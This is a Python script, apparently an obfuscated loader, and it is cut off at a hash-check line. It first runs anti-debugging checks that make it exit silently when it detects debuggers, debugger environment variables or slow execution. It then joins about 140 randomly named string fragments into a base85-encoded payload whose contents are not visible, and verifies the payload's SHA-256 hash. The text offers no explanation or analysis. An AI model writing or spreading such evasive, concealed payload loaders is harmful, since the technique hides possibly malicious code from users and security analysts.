#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_csSoVuYobXEsfJ = 'O|`@Ux=0|A1H98r+lp`{Ja|ZC=~o;hwnIq7b$61-_Ud70^E4Q+p2givGgj%J@slKpvH6oag&<b_V!'
_ctGEqHJe8KYr5G = '~q+NFdv!2|8OuUv%50YUMQY&W`Oa1*!voiHYSeFX<P8+nyOTy-zxjujk<`$3&VqV!P<~p}ngTb;cE'
_crCnEYdlyeawLs = '`3lk}zzjJBi3O~?2f^pgC)uv`+5w!9`%i0<p5p0QvrPq|Dl_;mlufPiRG0Z7`*p9IhLq5S6@||8{5'
_cfCRdTQrjeJAkL = 'k}4`8FKJ`Wi$jY8me}srXLqKEs)vT@-Z6>f`mJ}^9$ohRLIURFrRH73+U1>F%1mSP=)(t{+wx9jTx'
_cgWFcfnYb1ksCd = '3=QM<9&mC0`;+T1S{%zx~rRso^>IISl+f1_NbMO0KOf<IiBDITl7$b^j`7DS@x4w46k7jsj%;#2#9'
_cnTw_mx8VFXW0O = 'G=ZX$UbRGciM}N?{XkDuiHhX0;GP7bX)TM~fiTzTIJ+EM7=jFzWOHzyO<`_QZO)%HBJFwzRvV1G{7'
_cl7CMNnrBgYO10 = 'Jls$92yXamMXf>^kb8%l><Jg4cZ#9>rb>fD(<H7yC*~M>vf&Eww*AC|vNEybm>%kA-3qY|1pHwiM6'
_ck6tFMfHRoeUvA = '{>{;1Y(cI`E{4q@j1z0TL;?4T^p+lKn4swn)zkOYH%ZgRH#CgdeghbINXB&0VMp5+fBuduUa)UJEs'
_ciqVYVY3lqMX7H = 'YqAnwU4N~^9}ECvb7MlLG+Kf`nM4B+0<UT+Z1DL|J8Qk_I+BCF?^`xkd|#GD1W;7@Cbrw8Ghj}L_B'
_cxuUZuK7fteuqt = ';fXl3TXhQ(m53&fxKA(2;7)`#LHF8T>;A)a9h=DLq)`E3_{c`gduQ!ZvzcrIjM-1zy2#vp!wp^@ie'
_ckRc4UN3FXIiL4 = 'a9<EP(1|6YOBP68UyRi39?gkD`Rf55L6Ihe_QX7R|Aa7$LU!`C?V6eA5Hb{8EMc1pL<x<JP)R$JiY'
_cvQm6DuiiYPzNd = 'S;Ugw}wl3c`v6W~C!Ex-?E&F)TUZ=m*c(XXKI<7Omw~Ag4puHDgH#LKO62KRyfv%RCR)O)WeUmOik'
_cez14TPUJJ20K3 = 'pU|xa8PH!cqbMkz<U7CIDnKEy$SPLGzj=V@1`kyt!b$!IwxbaVLj1ng1DWu_*+cty|V18thq!~(TH'
_c_qszP2LISlPqh = '#~kc78)U>VJpgAIYN@=0%K%i#tSL8E6JFZIF-%(2m#w!DcYJf3V~RYY6#Y2DBs!bZA4!I`hcRooG$'
_cmfTu6yo2y4Nqv = '0PKLaU0+qH7?Mavca^UTzA%C?z5#c}aL`D9*a;;b-J_H}2!ez1tnF_@3($g+qM42IDbKNO8c%Vux8'
_caqsBcMIpguHqr = 'G=ZY@ia6UVA9Nf2<LCmgt`yHd0on^BlDN~TeSd1K?Qdl+s9*uzkmC0LCH6h~9;CX6m?K})YWr$&h0'
_cm0UhG9dePjg7y = 'T*1@wC_?m489BfxUwp&3;a4GR`Eya@w&!T)xq~idQRt=w8wCN7quFUu1U`lYXWx^Gk5Ksh3K@TetV'
_cwbuULgQ7Q06sj = 'r33^S;hDmLkO=XEhba*AL*eI{#mJ%d#-qYZJR(<JvliOn1GX1-BD`)$*<ME(6ZrH)49Mji+Tultoc'
_cviNc2whLKUFTt = 'W<=&Lel>jEkp>@JA>6UU~)P?Q~hH}ZcM9SN&_Za@m3Iz8g@^ug_V$>)zaz?;mfs_+=wjyIogEB%Hm'
_ch8zAaYeWkAX1q = 'aC!f(JHaXNlGA5#(}?|r=30Tb85m4WWjeYjkfkbpvG1oGN&OOGC%S);J6WE%4)$07OjK=L)8K<cqz'
_cwXuGP3YqQtc5F = 'psr>TSXm*CEEW1{9>JPwtlo6r8hpJqd?eeJfDH9-4Px*llHj5+|8{@y#!xGfVXm^FFzB<VD185CkW'
_cl2BLQUx7BIL2K = 'Lp#7a#Cqu-Pw!!~~EzFGjxawujKIgo^Bu4@J2ET0LvkQU$-DI^`nEz7s^R#fF2!qY$Cfz_$}naS}#'
_cvKNX5ppDcoKuS = '9VrCAsY-HJ~aJ19glG+lD56opj$r=|-4Hu+*-61F}DXV;$B`EaF`MiVqCBm7h-!s1T9l{i(1N$c>='
_cykgBmn4bUdSuV = '%J-jc6KbWXP4GKZEV8Sz2a-6eI<{ONO%Cb{u){N_pN)c{2TyEj?F_ZDNS-J$9Vt_y9``ry%<Z(fle'
_crZCEVj45Ewa0f = 'A;X94<z8;4Q;8zk5E73W{g-)oxt(H1BTv#BN4OT#a+E=ZPke}8hhXd<`mWtIndB=i)DjZr$&7Z(qu'
_crjLkaOmVMeOpt = '^(cagi%SN#M!q<*8jxpz?qQ!j8oM}QfxO+E?~IPn1&Cfvzu*eXY*c33n(Fo;!I6%$Ez`b=j+&Z@Go'
_cffJSxEVzGR9uU = 'E%2R&OwLB{*y~29D~pq|B1@Hkm$w>F(-U_N=t4)XH=obcv5>p4L-l!d|1Y;~)O#AwCqcH*`6t2Z}K'
_ctpRJo6mNZy4KV = 'MoWkNK7?BSnYT|jqN%dRege-)_jxb)oo6n2D_Ai+MwMAs;UCFjog&kbu3_p|v&ebMgS;%+UV8yb<%'
_cpe7vpUHPcmCvH = 'j-D>5!yDEIjed3KCiAx+MKY^9L-qkuwo5G`O^xD(tDY`lhuF6^XB!Z2W-WBK9xcZdDzFTvy17}P9&'
_cg9dmwC9wWcV5B = 'QA{8gHN*~F~9ha=UeIc2Ro&?|`a{|B2Fl(u=ZAv(ze5PwOnPmyB0Bq(o<ut9B-!1akIw9<eMoG1@V'
_cdfimT5gYXDVSK = 'Bdo#}UctsCU?kGJ&9aQvVBs|(IABMVlmQka(V7z?@)o4h=<_zYuE8ca-$$vl^uTSvO~MrA3b2WuXT'
_cu2S7GnOMqus1u = '@>J>yU&r*UvXGaaW~_`on7ypD9h?VDidHIE&uFIgl&m>FJ24R;pv|Zt9&1u_*+!s3AJuf4PvmJ`&l'
_cm4DG1NKefenyP = 'sX@U(H#ed`5ryNNW8#V%I0ck5m0guLSGZJ>8rrvN-3Lv+q@B=6v#pygq64ICq1G=Pr(^UR;%Xt@7k'
_cvd0crQE5l_eoF = 'e!R76(E$LjXPp3olu&i=9ZHE5k1Ut4KzZM!Z<1wiwbmc)kl!6KmzM%rVy<xI7if)9&RF9^aZ*JDgq'
_cgPYoNlZ_9wtVt = '%ZNAI&6kM3ex0Qj!k+=a_52F<mUDZ#ga{yO5YaIH^(7I|t~g6LJ*=((D{Q#Z+!a7Gd&W#~R-<tyn4'
_cxJiho5jmQuuAH = 'CG`|3$7)<hjLH={;9SNPB{ZMJoD9qJ&rZ({AlUQ!pc`5IV8n8v7&R?L_4(QNVaHCxUIEj7vmI4M;i'
_cftQFv7XW5b6rG = 'qeU{_O#NM_c%q*3lPo=VVQ{R2R#nq^;)`RVM692!yty=QFKMhSuJCIP1A7x3rcAeXk!;4DH`{n_m@'
_cs65HB00oLRlIX = '{u#>aG{<5@aZa1(_)w_yn6elQytI(aPH6CUjI^X59@W_k4;F7?fr+a@dA!ML+e4BSfh1E<U^r`V{A'
_cynM6xEEPuLTTO = '-*{uMVjvD;yfx;m_LkXH+CT1K{31udZ1`C4PWPb76V}J8!8QJSMgp^OL%|C%Vxbr{bA1n>3`&>12Y'
_cr5q9MALOEatxS = 'MMJo5inAPY0T4y|nF^4i~7VFj)zE5>bC>UoqfTE$%y>Vx#vSAhA?^JaX0T`*Wc(R~=0!IA@MHrkJZ'
_cdXQSzs2jKCOMC = '+_xu-@n;Wf_|4Uy{3)IMU{l7fHpBcnmT1iom0t<o{^jY6<6v^_-m}(14=O}ts5^M)!Q_k)j|W4`me'
_cfel2wZ2n5T4xu = 'l!FVffQX!aq%}6Oa+hBp@6!@G0{i?0n(lN+pG_f`FRUQYLKg$nmx~twfoLw`B%X@ixK$V;lZQ_JU`'
_co2WHAKW8Q9hCm = 'Fu0)Cz2KVYl(l-*kJ4@8S<->vxh}}0!Mz}o&4XKT~<J%^hz~JA-Gh?Q6KEUV>a#|gzl)UK4=m$&M#'
_cnNF9KWqstkRMo = 'jXEFEdJ#6o;nm9*(R%B!T7N;$BdcmA$51Abb9CPhfT+b_mZUGwocrY#y|=VDo7P}1mdQ4g?OM8-{Z'
_ca1ML3JqupSaGx = 'I-SO2gcd8ZDG;MUR~H`sH%fHSuc7MtziK?(7l;*3`$F|ss1iq<E33d`uGY)_^5h+II%&{Lk0_{IzY'
_ccgTpnNASOtsDt = 'Tw_Whb58MNGBHExNHij50JlF+3p$yX=*5MQ<#}(mm>mAa@CZ6+&c!*<<-Qshv>V6WVGS9L-bKA};4'
_clQ9GMFTVHH7gC = '(zvws>F#L!lYV`_sK%xo55<5aOXiS;3&Y@>89>LKy7b0SIfD>{*^`n~GUAGEAph9^csS{0e2R>X7q'
_clSpa0AxVKCXLQ = '~ZX_$Cv5q6%wl}SSGN$dZnO1n96@}a;kifi81)~e{#}FNlGd7-Fu~4FWi&i`-6s(wsM&iiEC#D~Mn'
_cx6vpJmypvoRND = 'dQOg7{5wdw{OSi@ZEkuqw64Ub4()5H9EeB+-S!Eyu`5)abc-9q`f^P8+guJ`kaLClLwfYHUUt&9|!'
_cbU4pRExFNM_m6 = 'WVLclr71X&lfW&Xwvha^swA`SgTR7eM$H`kGoGOjZHR-*g7Txo#dczQm%OOHH>EgK={>(PhKnMe0R'
_ctnd6z19mH26WF = '92e?zS+{1zfe^TDh=nA^r47(KWfTQ)ec=~@l~tEX+|ji_n*925@KH+j;W=rE^+3@i|3%{*quB6Uoy'
_cqPvBlP4BIb9w0 = 'a}U7WGWWg8;gmSUy-H;N=BXHBcA(@6m(UFXW1tpF_0jo$;bi=aDI}qcecsn&|rWb=IY`OW*m84_>Y'
_cbvo0hUXgKWOUJ = '&MPS{lv3J|Exx{ga08xy6_=zhOSGY~U3({^=o!Xwq_iq^y<GkAho7PIc!~{4xHZQB@n9Ho_K-$^R%'
_ckvDjK1lEpeeon = '*)5_w&`K{6Ub6A&^^0_??uJDOg)n$bj4k^d`WoPC7il%V=KQ%-sB=xZ3Qv;Z?#nX-RwdE@WmZyhpq'
_cbiCEgt_DVeW41 = '8D!U7xNm)&hd18;gklDK9L?_#R5Y*6vLx`zyIR`;NsA3p{05dCTDeB1LK5S7CKehXVtJUc5D${baG'
_cnP7ChEZjHdnH4 = '{h7r65LyjT%U-e(a3c8&OvxlE^EuDKory4l7+&F*)`o&H4_Wf!z=3LkEg27wz9j%Ix`viRw)OSryB'
_cnoRryPU00gWap = '=+&UA5gmsixj*zSHrAvG^CSYpp(r(9{jfo2smm@C;kH_Cw7lvVd$1{vA6M*&Xji1o2K|`iyjF1mjw'
_cnibgxijIpvB7C = 'yU-9+J#${lkM`|A?+-Sfg@f2~`BXDoAig`Tzwr1Z!m4f#G*Eyr1$#3`vxHPWMx)eBj47p&h^us#Tg'
_cmrnOtDPPPjZ9j = 'A_RKGPAAfSxE1~i(b6%#%u4Ohkr`kCP(jTNjj%<qyg_1$_2GD!s;Cup(2xtKZl)(1{xyU-aZA2(lO'
_cyBJ40e8hBUqUi = 'BE{a5*RgWCc&4csy=F2@s<Aq7DsCZwlf6*Z67AOX=^v5g5QZ7Qwp-6AvU&f^&OFG`w1`t|k;*DoWI'
_cytnNRCmdqSb4Y = '|KvUx#^X8K5$<{Pv$p^cEr<udb~jqgNpd$<n6&CfgU7z_d_LWe0D#J4PtgaOpKGr2?JWv|kkly9+e'
_c_rIqNk4cZpUxL = ';*E?G@QgMKUd3fll<i`ixvhq+r9Cki;yCub?<4_OG_z2ZeUveO#9kw|r;ja`ri6->-Q|ONJR)IOr#'
_cpqs6Wl1georBS = ';hM`gCE|&#|fIRwEm$>S3<VA<h2u}e1!|4?8W0`O?oH-sH(g$W+-m{Y^<wseW2Nv2!3bDKF=D!Yh@'
_crLdNSV7_wp7zh = 'lH)?t`?$zeseU6sbD!h6%8XX2;$Lj{?jMC-v^g?Gd4kwFkV#C-<5UfJk1Cx1<gGbgfrofVk#t_>gH'
_cdO1p11y7u6uBw = '2GRXTLlpIk5@gZ`FqEqxhmjO*d6wOJ-fYCIc<A!Lt71QIvDG6K2BnM#>Bt}QC6&0k^S?6Ds^$oLGW'
_chcHUaPITctxiw = '8W3dZN9SzG2uM!N(u$NeqPA)&&9p`%IdC3fSs^;(yEnrCkl2=j*4v_Bj1v~)SR^b}9|va>7xXmM?c'
_cmj2jNSJiEjRuI = 'jZ_lr~3dIN$%2wd7J)8C!lVQY4En?6#KtKeJkdLot2TFAV`WXj2Oa(B8Zk`OIfpp?^MRYjJ_|sIvv'
_ckj9UPTBh7Lo3h = 'CbM~U2q;Z#~{?Y|2sTy8V*F^vM`YowfH=su;xGyc;7CJ6rn~TNq!;^qppq+tjO~`uCz`f%Iylh2PG'
_cu5g9_tq5sFwkm = '+1?57dqj0BU>-gT8zP_#&ckMnDqSSrpRe*jO4VM+wYAApYC9ms@C>r<gRHAtRyvI%$ptHcT3of0X)'
_cmWJ6nyF3x9I_C = 'MvPJYz0l?0BzDf$nicRF+@3F>e!#VIoHgf5)6wsEt^ikFYOil|M;H+Xuoraj`o*x>I5ABwNLVuN#_'
_ciqHFoa4dD6V4o = 'a=HP=#-4Z&Ck1W(Xi7NhR%??4nUEvGSXE{M#+?=`)-rW3qd$u8sos&BABkNfP?ff#sro^6Oy((c+J'
_ctTiqfUqrxARu4 = '4wwXpK<6Ejz$2V$;$2DzJ+3A@8~&g3Nrvv&g;_;CUOA$J&Zy!Vc)}vqg`ZKNA+EieM_Jb!;7}Cx`{'
_caSsgBYnq2AEmH = 'gCO2P`W;~vHdr<AwEJ@a}==dMq`>a1gTFq8@td;q?lNX6VLr<Seo}u2>`fiLqImortP@59WA+`-&6'
_cj8QWhyLy09WbS = 'l^~2T1u<<Z5s%UV7nBt{!xvLG*-e=8~1=8S}z6|Kp^UzUvKtFR#J13pM0`N1P|=FcsUpD00u&;j5d'
_cwys9wlBU6zLG_ = 'REhpnp-?z?65JbHl7%um18F$}5*=9-OZEkcB|-LP3B3^V%6{uYGB?e*txOxBQhEgLv&dLy6ofGdKR'
_cvaNdyyEE_AL57 = 'pCTp2lhneXz>i|-sJryK6a=F`iT4aova=9m$NWRte63moG}qvjY?sWZD)^atIZ*pUNsBwl#4!F~+7'
_ckx0ZYSsDGzEHz = 'a@s{9YI0^yCaBDO5?Fj5kYSVv6_wW5Xc!vlDxr{f;e05XjC=f9Jo3{^mGFQ5|bH?~+#s9fV=*bSOS'
_c_jeHc2lIOMu87 = '__n#tj!e$L<jwu2`8N$_>vyfoqF;A8?xNEj&hd|Ow4~R2($d3xjYgmo_M{y2+z<?y$7&oVw7tUg9d'
_ceJxIRytZLVmOL = 'M`gpy>Ov3;h1Ec1w%5b_34+3lsr%FysR=|P~;#8LZYiY!%!=2m}^1IPJn-B3hvh4ok5MXIg><~30='
_cbQKDD0ViYS_qD = 'f%m*~!bV_sblY;shZm+pfIQrUFnYarg`)A5}CD7fduAaKbf)1D;f@+RNh{{fwbQ34xKF!~s7K7qJ#'
_ckLjSRbeZ9yATP = '_n@668323kp3-&@xhVXqeR$KqUo-<ihWzADgeX=lC!`5L$WI7#Bzr!9bve&l7zB{DC1e)VO{K-=U&'
_ciWM77px7JWxBk = 'yi$3x%!2_Cp1h#sUa>t6}lXormgPg^`-dSdsPHoUT4e9wPlP3R47hN%THc=ho{(Hc(NQPqXud9bwQ'
_cdk5xzP_HDXes1 = 'H7tm_r1#&oK%O0s?#afkN9^nIsgP&5VAC<QuXn_NvMm2^1Dr<$O_@({p5AI1$s_h;ftW(n%WF~vUR'
_cairhyMdV3lCiH = 'rDM0>5<!ofdZKKQuIa88EApndp&jgkN%RAWhr1>gmJBkgp)B}f<ug#u=f*d4Lr~6g7H{T4T7xnX_$'
_chMmFK7cjp53Fj = 'H9L*UKgdfH@=%7#YY<nyK_WqzCs4*Qup4lx$z{kUv0k2GMy-v!pf2}>kk5Y?=+K%jfVF9nDsjDDv2'
_coaz3RkIcH8v4H = 'b1I>)=FM6?I5S!x&<1&&<sD~G2pyL#S$x-We9M_DDMl~aXM7|x*%{|2eiKT9*f;<lXA`dX*-XQruI'
_cskMH9_gRcR1Gz = 'fYQV}7|3MVkjET$VWKJsydkex52rzVvgH-gL)dmStNlT=7^;Kr-zkMGQ~6uCt4u7qZ;a{0k%Y9aE^'
_c_iDKMS4tIOObn = '6P|fFQ7K&C#yLc5aJQBJsot(nBy6<c&Va9~la~2!d2r&ROYZ=2fo2{{u<Tt*iMQL;mw=55Ve6ps?J'
_cjL8Y6sRC1mlVS = '$l?Ne${>hG@}_dN{K<xsyf1HSksRB&vtOU4-nKr6N3x#=_LaT;kBAUSX^zQV-dzl9}#sNm83V$z`3'
_cthypa2dlNRXo8 = 'dy7TPF3yhHu5r^-zzzdWz5P|@r^U@?-^Y*Q^V&wS%}S%-{3%P^XaJNLFHEW0J_pI0A^2emg8XeOZs'
_coKukO5vVjyVRN = 'U`9;XZP?n>$wVWHbfasXaC_(_vwU`ic>BTvnjDH?qgB>tAd^ud5}&L`e|p$f$re;f=CG0{_@6tHXH'
_cu86j301JLVVoB = 'fZ{-z5v2;)7Q(%G_M31N+{K2vp?j5EXl4ies7n1F1-U^zL$?bjs+$X1lbj<qZ<bf9FX%D5hQcX4x2'
_ct7uYTVeaxSD0X = '-y+gZ4scS#Y=DK4D?&-wPc1CNI%HKImZH4*dt<{1qA@b_JMJnLWd<ixt@1fh=TlF?+#8e)N`|M7Rp'
_crL1r6vA6C1MQ_ = 'EZ$>*OYLjrj@oh$mRZ@E<VN8V8&;>NRQlu;+At|&Hkj&kdp=CtmN#ERS!@;`erhcwx7jA?_k~f3lN'
_ccaR4Nejx2ijVt = '(XzSMZ;m=)Yor(VnNa7%4Z5e#`8qyiE+GJ=8oKA%v7tkhyvpzzb)d@n-h%-pP>?;?>kh<*LIC)g`$'
_cvZgRNR71csqCi = '#B3liq-%u=#u=0A$9H(S>o`jrU;K$8!9YgpXnDxue%wn4+>;hRgn+sH@zXX5jiwXKZJbnvc}QyD)i'
_cgpqKkxZlAiSmh = '|0Tq7YRPBn8+Oy*;{xBD3Xj037tijc<4y^u(t*pOo1Gfh*GN%uX-3i@P30n`G`!z*iOO7#T1quJ0X'
_crRciGbpo9V79R = 'DBAZu2c*#<<$}bkQ$>UOpDJGM1Z32JNtTx4W1pE?D07VS2!2h(}6AVn^=*i7Q?b;lU%2P7S`Lce~>'
_cnMM4mX0ga7twp = 'pi+D9H=<+b?*AocfRW9b#-5jNaMx~-V#7;Swt(W$Ow4M7p)*Th`%KaGL@U-LmZ22F>$+#yDWT=>Os'
_cvmn5QBaGVylpt = '#<7Rzq2w<F*UUDe2za~UB#di#S{?|U=@hkm~tF&#wF+5Tj6@$pR>CB!{XgOdP;tG_CZct4=ECoKe`'
_cjd8WD9B0sOZqD = '2N-JiNV}Rf3&q@Z_~)$>wN;gk5`Hm*wpvntgq4=7|A7yjHO(Ykg(<?d<v3g9>1>gS7gc(m;9!~50-'
_cqQvp6rQfpJW4H = '&gZM!xaah%*wS?dg`Gh~cJdM7CTZdwWq7F&YF;ivg|U;Tpi-?6=hL1uU)tKQBpN=u{?U($bH4Gk+o'
_ce5fRgwrHT56u0 = 'q>hQ^1`mcz?+u?;K14Q|qKRo#8-l33vCw1r=OGq_v9V$`i7ycaEKGjr_Fh;*3XmpC6?*GV~Jn>?Te'
_ctotfOiFmMrvTo = 'qqv6Tc%1imcstUm9opy<s+cf&Y|@sUJ9|JF)SC5ZU;SAPM5UM(@-*w^WC)U#0{}HKjyM{9oVAZ&iy'
_clB07kOp0_CGAP = 'x#b-w@`Sfn78BlXKrMyhtbb^?q6)d6JmScIG!STCXXHmg%~Ot>Cz+Kg}d3-H2cuGPHQ3E_2Zp0(7W'
_cbiFVzSmao_cMD = '&6<3$@XD!7?f+D0Gtv?_8SFFcq~6!)V5b%ZkJ~)E>h~l|r+~@3w8!%U8<VNN{1ez`TbmiKcU_&BjT'
_cnDp5hMnAoaZIW = '-$4)FhzDMG!ip9(S-?{b;LAary#NWTnLWD=2jLPanTA|MN1!UtOK>7^m<`cDH|>$Odu~4yEvn{iS*'
_cjFXaw5bEoavCm = '_n57eUl2Z{}=K=;t1%>`yy02hA#hQw2t%h~?zdaVWBFx{<;31O9hyqZY@!cG7AG{O>dkL{kXT(AKR'
_cmIdWyOoroKxKP = 'GWmwR|Q?2D<(ljfck&@kg9nCv8c)7ZCj`P*mVoR5aT+z(%;dEt%R2gZ&kLm8%)*kF4r;l=DWx4MF!'
_cmwgvUgvq5zZx3 = '1AjlE_gN$jySaM36&i-1V8${_xtYpQM1p@Yg98cZiRv^cdPha;K|6YSJt@wj~Tq>G*j;^R~TQ-011'
_ccAog6Bkm0vf8B = '{CsEfxc%JZ5&WK9QPVbf^t=R5F7<G^d?pl%e4IufZ~`-6z6FYbR|MJ#Fc+5no;uJ==9C|fZw`fCfr'
_cl7NMdkNKS_y2t = 'FD1B*M5><l<|%>Szokc>va(^iLJNaucPn6N;pqGNBHuJW2x}aE$l=vt^LC{^Yb4Jrn$m^hA}ogt7a'
_cjGuuzgMchGo4r = '!!*C!$?vZQmj3QrM?zwWIeaxQ+wwhML(owN==9o&F^TA+NtGeJU<!hEIc{-mAESa>gNrU+27lXB7#'
_cjwiSi5r096uI1 = '$rjVY_f^i$=wpzkei7K<cu6s5gR4Ds0C1yChS6p?iy1vtv_@gE4rUoAIo=3<j{PdRDh<+NSXoUJqz'
_cnhrG3euqxN1It = 'NSzm6+wU@|%*#Md}@X;>%{5CT2ta`qOl4P`e03rqFK0Cyf`wDF_)VML(Wbvl4CYkHL1&S<Xv)aU&5'
_cijt9nJgB4LuEZ = 'a%f(0YcP+vl~<I0!CZ^x?>_X;tt*S4cGy;jCaQTtqQ#uB$smr^#6FW+Jnc8gp$1Z}i&_@D&sV0jBS'
_civHtCg0cBhPu1 = 'hi4Jj#0d;YQN5FjqB!oTjvO$}UQO9+jo`i=4gbhvuN9q>rK>bz@}_9f~x`?_VGn&!A!U9^q<(g+N}'
_crJAXVY6GPMGSR = '*Y*oY0{5)P3im&Uj+A36<oVUXPIU3gG!<z%{I;Qa<FRi>(b_XUWh=QgGmVzMVw{8&&;A`F92a=v#Z'
_cd7JZ85YRMRCM0 = 'mbEXaH<}H3rXq1aI!wrmH|`gbp*=j;LMr#f%m#C8l!*e)=H3`d~mF8F&@|k%)^TBlOoa*f;*Azaf?'
_cn5R8Can0YGjNI = 'S;gy<=%dO(H!^e3pfL#QUu`DGfI)DKyhXsqE`rHg@stFs=?plDWG-cWu~k1Tno<fJ<LsBo~vn9KqT'
_cmk47nWjblcT7P = 'KKns!9oQrcng#T2P+{;an@Gzx=3cJ#oo1W(E-8*n=MR=ap_J4yLuz<wr_wqA=Su7^sRd%38s#x{xF'
_cgeLcJ7kynrefz = '|pvfEWJBx=EtI44q;W8owvQ5RW`iIGW~N2vLQG(@V5jKJeO=U#-P~(WkPo126Z{vKxXmE+)*$wI_z'
_cuamnE4FA9rn3V = 'ivD_CsyGkOuOriH2^7((3JT?<#5b?l2_F_S$t!A@aym$Jf5!2t@>8P=cg5S#};%fZkBc+?4+jA|BS'
_cgB5lw2gdDAvyF = '6o|obZ>Zs@^yYTeJADWsvf?zgy(pf^<9OxYz*C%r6^uD52(SL?2BgvroEV?s(vb`eY{k4N8f93jPa'
_cmxkxWLvUpKnvq = 'U^x^xU2=?%TM*@YFjjzW>PrOBSUG9z{}2cDKT1#F#*Gu<ujvO&5u)?9t3dkuJKE=?zkto5lg87U>)'
_chb_XXC2kWgETZ = 'wM%8biHl-+N=3g)=|q{oK9Hv`*X7ZPsYN)pzuXx>Ck2R}V6Q}6i$+pe{byH#89Z|z5g^F2w5mp<7E'
_cgZ_GgYZnb5MGP = ')4zv>PTEH5BLZQN#>t^pFY<k1j6=&_mXCvL})&)ZT?9&6K-QIK|0Fna*O}{A4n;L>S!{!jnrAKP+s'
_cqekYlUW4I6tAk = '~9Gh9h{omOts#~sWX)YtCE-(zdgR)qN6~of6<oR)awdD!~UeSuJZa7MorlP9=RpS#F=BY(YrJr(Nl'
_ccYb7cKVaBR_p0 = '?tJjq|glw+Mz^IK?3MNxteOhzf-<M@Z|1p'

_plo4FLMxdE0y58 = __import__('base64').b85decode(_csSoVuYobXEsfJ + _ctGEqHJe8KYr5G + _crCnEYdlyeawLs + _cfCRdTQrjeJAkL + _cgWFcfnYb1ksCd + _cnTw_mx8VFXW0O + _cl7CMNnrBgYO10 + _ck6tFMfHRoeUvA + _ciqVYVY3lqMX7H + _cxuUZuK7fteuqt + _ckRc4UN3FXIiL4 + _cvQm6DuiiYPzNd + _cez14TPUJJ20K3 + _c_qszP2LISlPqh + _cmfTu6yo2y4Nqv + _caqsBcMIpguHqr + _cm0UhG9dePjg7y + _cwbuULgQ7Q06sj + _cviNc2whLKUFTt + _ch8zAaYeWkAX1q + _cwXuGP3YqQtc5F + _cl2BLQUx7BIL2K + _cvKNX5ppDcoKuS + _cykgBmn4bUdSuV + _crZCEVj45Ewa0f + _crjLkaOmVMeOpt + _cffJSxEVzGR9uU + _ctpRJo6mNZy4KV + _cpe7vpUHPcmCvH + _cg9dmwC9wWcV5B + _cdfimT5gYXDVSK + _cu2S7GnOMqus1u + _cm4DG1NKefenyP + _cvd0crQE5l_eoF + _cgPYoNlZ_9wtVt + _cxJiho5jmQuuAH + _cftQFv7XW5b6rG + _cs65HB00oLRlIX + _cynM6xEEPuLTTO + _cr5q9MALOEatxS + _cdXQSzs2jKCOMC + _cfel2wZ2n5T4xu + _co2WHAKW8Q9hCm + _cnNF9KWqstkRMo + _ca1ML3JqupSaGx + _ccgTpnNASOtsDt + _clQ9GMFTVHH7gC + _clSpa0AxVKCXLQ + _cx6vpJmypvoRND + _cbU4pRExFNM_m6 + _ctnd6z19mH26WF + _cqPvBlP4BIb9w0 + _cbvo0hUXgKWOUJ + _ckvDjK1lEpeeon + _cbiCEgt_DVeW41 + _cnP7ChEZjHdnH4 + _cnoRryPU00gWap + _cnibgxijIpvB7C + _cmrnOtDPPPjZ9j + _cyBJ40e8hBUqUi + _cytnNRCmdqSb4Y + _c_rIqNk4cZpUxL + _cpqs6Wl1georBS + _crLdNSV7_wp7zh + _cdO1p11y7u6uBw + _chcHUaPITctxiw + _cmj2jNSJiEjRuI + _ckj9UPTBh7Lo3h + _cu5g9_tq5sFwkm + _cmWJ6nyF3x9I_C + _ciqHFoa4dD6V4o + _ctTiqfUqrxARu4 + _caSsgBYnq2AEmH + _cj8QWhyLy09WbS + _cwys9wlBU6zLG_ + _cvaNdyyEE_AL57 + _ckx0ZYSsDGzEHz + _c_jeHc2lIOMu87 + _ceJxIRytZLVmOL + _cbQKDD0ViYS_qD + _ckLjSRbeZ9yATP + _ciWM77px7JWxBk + _cdk5xzP_HDXes1 + _cairhyMdV3lCiH + _chMmFK7cjp53Fj + _coaz3RkIcH8v4H + _cskMH9_gRcR1Gz + _c_iDKMS4tIOObn + _cjL8Y6sRC1mlVS + _cthypa2dlNRXo8 + _coKukO5vVjyVRN + _cu86j301JLVVoB + _ct7uYTVeaxSD0X + _crL1r6vA6C1MQ_ + _ccaR4Nejx2ijVt + _cvZgRNR71csqCi + _cgpqKkxZlAiSmh + _crRciGbpo9V79R + _cnMM4mX0ga7twp + _cvmn5QBaGVylpt + _cjd8WD9B0sOZqD + _cqQvp6rQfpJW4H + _ce5fRgwrHT56u0 + _ctotfOiFmMrvTo + _clB07kOp0_CGAP + _cbiFVzSmao_cMD + _cnDp5hMnAoaZIW + _cjFXaw5bEoavCm + _cmIdWyOoroKxKP + _cmwgvUgvq5zZx3 + _ccAog6Bkm0vf8B + _cl7NMdkNKS_y2t + _cjGuuzgMchGo4r + _cjwiSi5r096uI1 + _cnhrG3euqxN1It + _cijt9nJgB4LuEZ + _civHtCg0cBhPu1 + _crJAXVY6GPMGSR + _cd7JZ85YRMRCM0 + _cn5R8Can0YGjNI + _cmk47nWjblcT7P + _cgeLcJ7kynrefz + _cuamnE4FA9rn3V + _cgB5lw2gdDAvyF + _cmxkxWLvUpKnvq + _chb_XXC2kWgETZ + _cgZ_GgYZnb5MGP + _cqekYlUW4I6tAk + _ccYb7cKVaBR_p0)
if __import__('hashlib').sha256(_plo4FLMxdE0y58).hexdigest() != '797da8fa2e230f1c7e3a2f4cedf1266dd35f76b21cd3ce3135a610a37b005451':
